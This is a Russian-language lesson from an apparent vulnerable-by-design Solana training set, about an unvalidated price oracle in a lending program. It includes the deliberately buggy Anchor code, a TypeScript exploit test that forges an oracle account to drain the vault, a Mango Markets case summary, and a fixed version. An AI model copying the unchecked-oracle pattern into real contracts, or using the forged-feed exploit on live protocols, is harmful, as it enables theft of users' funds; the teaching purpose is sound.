# 09 — Непроверенный оракул цен

**Класс:** Missing oracle validation (owner/freshness/bounds).
**Файлы:** `programs/vuln09_oracle_manipulation/`, `native-programs/attacker/`
(mode 1 — подделка фида), `tests/09_oracle_manipulation.test.ts`.
**Последствие:** 1 единица «залога» покрывает весь lending-хранилище —
вся ликвидность выведена.

## 1. Суть уязвимости

Lending-протокол «Oracle Believer» при `borrow` оценивает залог так:

```
value = position.collateral * price     // price берётся из переданного аккаунта
require!(amount <= value)
```

`oracle` — `UncheckedAccount`: программа **не проверяет**:

1. **Владельца** — аккаунт может быть создан кем угодно с любой начинкой;
2. **Свежесть** — нет проверки слота/времени обновления;
3. **Разумность** — нет границ (min/max) на цену.

Атакующий создаёт аккаунт своей программы, у которого байты `[8..16]` (мимо
дискриминатора) содержат нужное «значение цены» — и берёт займ на всё.

## 2. Уязвимый код

```rust
#[derive(Accounts)]
pub struct Borrow<'info> {
    #[account(mut, seeds = [b"pos", user.key().as_ref()], bump)]
    pub position: Account<'info, UserPosition>,
    #[account(mut)]
    pub user: Signer<'info>,
    // БАГ: фид цены — что передали, то и прочитали
    /// CHECK: должен быть PDA-оракул протокола — но это не проверяется
    pub oracle: UncheckedAccount<'info>,
    #[account(mut)]
    pub destination_ata: Account<'info, TokenAccount>,
    #[account(mut, seeds = [b"vault"], bump)]
    pub vault: Account<'info, TokenAccount>,
    pub token_program: Program<'info, Token>,
}

pub fn borrow(ctx: Context<Borrow>, amount: u64) -> Result<()> {
    let oracle_data = ctx.accounts.oracle.try_borrow_data()?;
    let price = u64::from_le_bytes(oracle_data[8..16].try_into().unwrap()); // ← любой аккаунт!
    drop(oracle_data);

    let value = ctx.accounts.position.collateral.saturating_mul(price);
    require!(amount <= value, Fault::OverBorrow);
    // ... выплата из vault ...
}
```

## 3. Как эксплуатируется

Тест `tests/09_oracle_manipulation.test.ts`:

1. Протокол развёрнут с настоящим оракулом: `price = 1_000_000`, в lending-vault
   1,000,000 токенов ликвидности.
2. Атакующий вносит **1 токен** залога (`depositCollateral(1)`).
3. Атакующий через программу-атакующего (mode 1) создаёт PDA-аккаунт, в байты
   `[8..16]` которого записано `531_000` — этого достаточно, чтобы 1 залог
   покрыл оставшуюся ликвидность vault (после первого честного borrow).
4. `borrow(500_000)` с `oracle = fakeOracle` — программа читает «цену» 531_000,
   умножает на 1 залог → лимит проходит.

```ts
const price = Buffer.alloc(16);
price.writeBigUInt64LE(531_000n, 8);        // bytes[8..16] = цена
fakeOracle = findPda([b"forge", price.slice(0,8)], PROG_IDS.attacker)[0];
// создание+запись через программу атакующего (PDA может «подписать» создание)
await sendTx([nativeIx(PROG_IDS.attacker, 1, price, [...])], [attacker]);

await program.methods.borrow(new BN(500_000)).accounts({
  position: attackerPos,
  user: attacker.publicKey,
  oracle: fakeOracle,        // БАГ: любой аккаунт
  destinationAta: attackerAta,
  vault: vaultPda,
}).signers([attacker]).rpc();
```

## 4. Результат атаки (проверяется тестом)

```ts
// после честного borrow: ata = 500,009, vault = 500,001
assert.equal((await tokenBalance(vaultPda)).toString(), "1");            // vault пуст
assert.equal((await tokenBalance(attackerAta)).toString(), "1000009");   // вся ликвидность
```

Залог атакующего — 1 токен; унесено — 1,000,000.

## 5. Реальный кейс: Mango Markets (октябрь 2022, ~$114M)

**Mango Markets** — крупнейший инцидент класса oracle manipulation на Solana.
Атакующий (Avraham Eisenberg) за счёт низколиквидного перп-рынка MNGO
«накачал» цену фида, использованного протоколом для оценки позиций, открыл
гигантскую long-позицию под надутый залог и вывел всю казну протокола
(~$114M) под видом «легального самозайма».

Родственные инциденты: **Solend** (2021 — сломанный оракул фиктивного рынка),
**Zeta/MNGO-подобные** атаки на перп-фиды. Урок: ценность залога должна
приходить из **криптографически привязанного, свежего и ограниченного** фида.

## 6. Исправление

```rust
#[derive(Accounts)]
pub struct BorrowFixed<'info> {
    // 1) только настоящий оракул протокола — PDA
    #[account(seeds = [b"oracle"], bump, constraint = oracle.owner == crate::ID)]
    pub oracle: Account<'info, OracleFeed>,
    // ...
}

pub fn borrow_fixed(ctx: Context<BorrowFixed>, amount: u64) -> Result<()> {
    let oracle = &ctx.accounts.oracle;
    // 2) свежесть: цена обновлена недавно
    require!(clock::Clock::get()?.slot - oracle.updated_slot <= MAX_STALE_SLOTS,
             Fault::StaleOracle);
    // 3) разумность: цена в пределах коридора
    require!(oracle.price >= MIN_PRICE && oracle.price <= MAX_PRICE,
             Fault::OracleOutOfBounds);

    let value = ctx.accounts.position.collateral.checked_mul(oracle.price).ok_or(Fault::Math)?;
    require!(amount <= value, Fault::OverBorrow);
    // ...
}
```

Правила:

1. Оракул — PDA протокола либо верифицированный Switchboard/Pyth-аккаунт с
   проверкой `owner`/`account_type`.
2. Проверять свежесть (slot/timestamp) и границы цены (deviation limits,
   max/min).
3. Учитывать ликвидность источника цены (Mango-кейс): фид по
   низколиквидному рынку легко качается — брать TWAP/агрегат нескольких фидов.
4. Для производных значений — `checked_mul`, а не `saturating_mul`
   (насыщение может скрыть абсурдную оценку).

## 7. Запуск

```bash
./scripts/run_tests.sh tests/09_oracle_manipulation.test.ts
```
